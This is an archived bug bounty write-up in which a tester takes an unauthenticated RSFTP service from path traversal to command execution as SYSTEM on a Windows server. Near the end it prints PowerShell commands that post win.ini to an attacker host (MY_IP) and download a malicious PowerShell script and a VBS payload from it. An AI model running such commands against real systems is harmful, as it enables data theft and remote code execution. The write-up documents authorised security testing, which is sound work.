---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-11-03_unauthenticated-rsftp-to-command-injection.md
original_filename: 2018-11-03_unauthenticated-rsftp-to-command-injection.md
title: Unauthenticated RSFTP to Command Injection
category: documents
detected_topics:
- command-injection
- sso
- idor
- ssrf
- xss
- path-traversal
tags:
- imported
- documents
- command-injection
- sso
- idor
- ssrf
- xss
- path-traversal
language: en
raw_sha256: 997ea5e60b217466ae612d2e04c2d1750f52f220ac2d172d1529c6584009053a
text_sha256: e370ae4d45eef1b97c0ec8cc18295f4bad6de244b459589054e195504d94dbad
ingested_at: '2026-06-28T07:31:58Z'
sensitivity: unknown
redactions_applied: false
---

# Unauthenticated RSFTP to Command Injection

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-11-03_unauthenticated-rsftp-to-command-injection.md
- Source Type: markdown
- Detected Topics: command-injection, sso, idor, ssrf, xss, path-traversal
- Ingested At: 2026-06-28T07:31:58Z
- Redactions Applied: False
- Raw SHA256: `997ea5e60b217466ae612d2e04c2d1750f52f220ac2d172d1529c6584009053a`
- Text SHA256: `e370ae4d45eef1b97c0ec8cc18295f4bad6de244b459589054e195504d94dbad`


## Content

---
title: "Unauthenticated RSFTP to Command Injection"
page_title: "Codegrazer: Unauthenticated RSFTP to Command Injection"
url: "http://codegrazer.com/blog/rsftp-to-command-injection.html"
final_url: "https://codegrazer.com/blog/rsftp-to-command-injection.html"
authors: ["Nicodemo Gawronski"]
bugs: ["Path traversal", "RCE"]
publication_date: "2018-11-03"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5608
---

![Unauthenticated RSFTP to Command Injection](../img/unauthenticated-ftp.jpg)

  * __Nicodemo Gawronski
  * __3 Nov 2018

## Introduction

Not long ago I was invited to a private bug bounty program managed by Bugcrowd. The bounty description page caught immediately my attention as a *.domain and all customer IP ranges have been added to the scope. These are the kind of private programs I love as the attack surface makes the hunt extremely exciting.

As usual I added the customer's star-domain to the target map in Burp Suite and started clicking around the main website to get to know the target and discover new content. Long story short, after a couple hours I had reported few low hanging fruit (XSS) and some interesting IDORs and CSRF to account takeover and such. A promising target.

While I was still going through the numerous web applications, I received an email as one of the blind XSS payloads I submitted through a support form got a hit and requested a file from my virtual private server (VPS). Immediately I SSHed in to the server to check log files. As it often happens though, the payload did not trigger but was probably only presented as an URL to the support staff (read "my HTML code had most likely been encoded"). Someone (a staff member) or something (a server-side URL parser) had accessed the URL. The XSS payload didn't work as expected but gave me a tiny piece of useful information: **the IP address of the remote server**.

  

## Reconnassaince

Just by looking at my notes, I soon discovered that the IP address by the failed XSS was not yet part of my initial recon findings. A quick check with WHOIS confirmed that the IP range was indeed part of the customer's assets. 

I ran a quick **Nmap scan (-Pn -sV flags)** to check whether any of the IPs were up and running anything interesting on the most common ports. I usually run first a quick scan before I start venturing into a full TCP/UDP scan. 

Of all the results, few caught my attention but only one really stood out:

`Nmap scan report for CUSTOMER_FTP_SERVER Host is up (0.15s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 26/tcp open rsftp? 443/tcp closed https`  

## What is RSFTP?

RSFTP is a simple FTP-like protocol employed when you think that SSH/SFTP are too mainstream.

**Is that it?!**

Alright. RSFTP standard port is **26**.

  

## It's a long way...

The first thing I tried then is to simply connect to port 26 with **telnet**. Nothing appeared apart from:

`Connected to CUSTOMER_FTP_SERVER ^`  

Did I just log into the FTP server without authentication? No Banner? No login prompt? Nothing? Is this even working? **What is the meaning of life?**

  

## Path Traversal

Attempting to run the **ls/dir** returned a list of files available in the root folder of the FTP server.

These available files were mostly .exe and .bat files, something you would see on a Windows system.

  

I then tried to list files in a directory below the root of the FTP server and luckily enough, I was able to view the files stored on the **C** drive with a simple **"ls ../../../"** , **"dir ../../../Windows/System32/"**. Very interesting!

![C drive directory listing](../img/ls_ftp.png)  

Listing files is fun (not!) and all but somewhat not enough to demonstrate the impact of the vulnerability. 

  

## Errors over errors!

Ok, what other commands can I use? Surely I can download/upload files. It should be fairly easy...

![definitely nope!](../img/nope-meme.jpg)  
  

Unfortunately common FTP commands did not work as I couldn't download nor upload anything at all. Not even **"cd"** into another directory.

  

I tried the following list of commands:

`account, append, ascii, binary, bye, cd, chmod, close, debug, delete, disconnect, exit, get, help, lcd, ls, mget, mput, open, put, pwd, quit, rmdir, !, ?`

The only thing I received back from the server was:

`400 StatusText=Can't handle request;`

or

`Error: 998 Invalid access to memory location`  

**WHAT!?**

This is something I haven't seen before in an FTP server.

If you Google **"Error 998"** , the first result will redirect you to Microsoft's site: [Microsoft's site: Invalid Access to Memory, 998 error](https://support.microsoft.com/en-gb/help/833620/invalid-access-memory-location-998-error-message-when-a-32-bit-applica). 

_"This issue may occur if the LocalGroups input parameter is specified in the LsaLogonUser function in the 32-bit application. The "Invalid Access" error occurs because the 32-bit structure that is used in the function is not correctly handled in the 64-bit environment."_

And my brain went...

_"I felt a great disturbance in the Force, as if millions of voices suddenly cried out in terror and were suddenly silenced. I fear something terrible has happened."_

Therefore I decided to use a different approach to get to read at least a file hosted on the customer's server as proof of concept. I understood that this was not a standard FTP environment, nothing I have seen before, and probably I would have to find non-standard commands to work. It is very unlikely that users can access an FTP server just to see a directory listing without any other possible interaction.

  

## Help is not coming

I needed help, perhaps in the form of the help menu often available in FTP implementations!

Tough luck though. These didn't show anything (a part from the usual errors):

`? help rhelp menu /? h -h HELP ^? \/? man ls --help hlp support please help!!! `  

**Before you say it** , yes, I could have checked "C:\Program Files\" to find the name of the FTP software developer or some relevant information to solve the puzzle but it didn't come to mind at that moment.

  

## Commands!

I then tried to bruteforce my way through a list of standard commands used on Linux and Windows to see if any would work and luckily few did:

`mv --> Error: missing arguments (used to move files on Linux) cp --> Error: missing arguments (used to copy files on Linux) echo --> Error: missing arguments (used to display a line of text on Linux and Windows) ls --> No Error (used to list files on Linux Systems) del --> Error: missing arguments (used to delete files on Windows) rm --> Error: missing arguments (used to delete files on Linux)`  

Great! I was able to copy, move and delete files from any locations on the system, including "C:\Windows\System32\". The FTP server was **running as SYSTEM (Local Administrator).**

At that moment I decided the bug was critical enough to be reported immediately and hopefully get a priority one (P1) bug. I filled the report and told the customer that I was still trying to get something better out of the vulnerability, possibly a reverse shell or at least an abritrary file read.

  

## ... if you wanna command inject!

**How did I take it further? I tried harder!**

After several attempts (read hours) and typing words directly out of the Nerd dictionary, I discovered the system responded differently to two specific keywords: **"run"** and **"exec"**.

`run --> Error: missing arguments exec --> Error: missing arguments`

I soon-ish discovered how to use them to execute arbitrary commands (Bonus: as Systems)!

The correct syntax was:

`exec("cmd /c ipconfig")`  

The kind FTP server would display either a generic but much appreaciated "Successful" message without showing the result of the command or show a now-well-known generic message:

`400 StatusText=Can't handle request; Error: 998 Invalid access to memory location`  

To confuse me even more these two errors appeared at irregular intervals even when the command was definitely correct. Disconnecting and reconnecting to the server would do the trick only about 25% of the time. The remaining 75% it would error. I haven't figured out why.

To confirm the execution, I first ran the **"net user"** command and piped the output to a file. I then added a new user with "net user" and ran again the same command and piped its output to a second file. The two resulting file sizes were different. I then removed the user.

The final confirmation was done through the ping command which worked like a charm:

![ping confirmation](../img/ping2.png)

To end the post, these are the proof of concept code used to get files from and to the remote host:

**Send win.ini to my VPS:**

`run "cmd /c powershell Start-Process powershell -Verb runAs 'Invoke-RestMethod -Uri http://MY_IP:8080 -Method Post -InFile C:\Windows\win.ini -UseDefaultCredentials'"`  
![Confirmation of win.ini retrieval](../img/rsftp_win_ini.png)  
  

**Get a malicious powershell script from my VPS:**

`run "cmd /c C:/Windows/System32/powershell.exe Invoke-WebRequest -OutFile nijagaw.ps1 https://MY_IP/nijagaw.ps1" exec "cmd /c powershell Invoke-WebRequest -OutFile nijagaw.ps1 http://MY_IP/nijagaw.ps1"`  

The same can be achieved with a vbs script:

`exec "cmd /c powershell Invoke-WebRequest -OutFile C:/VBSMeter.vbs http://MY_IP/VBSMeter.vbs" run "cmd /c powershell Invoke-WebRequest -OutFile C:/flightline/FlicaRemote/VBSMeter.vbs http://MY_IP/VBSMeter.vbs" `  

This is the end of the story.

  

## Lessons learned and Considerations

  1. Don't focus on web apps only. Infrastructure is fun too;
  2. Nmap is your friend;
  3. Get a cup of tea;
  4. Try harder.

## Timeline of events

Action | Date  
---|---  
Reported | 2018-09-30  
Triaged by Bugcrowd as P1 | 2018-10-04  
Customer request more info | 2018-10-05  
More info provided | 2018-10-05  
Resolved & Paid | 2018-10-29  
  
* * *

##### Tags :

__Nmap __Reconnaissance __Unauthenticated Access

![](../img/author.jpg)

### Nicodemo Gawronski

[__](https://www.twitter.com/nijagaw)

My name is Nicodemo @nijagaw Gawronski. I am the founder of Code Grazer. Penetration tester during the day, bug hunter at night on bug bounty platforms such as Bugcrowd, Hackerone, Cobalt, Dvuln and Zerocopter. My experience in the field varies, covering web app and mobile application testing, internal network penetration testing (including wifi security assessment, firewall review, build review), IoT and hardware hacking, social engineering, phishing campaigns and last but not least programming.
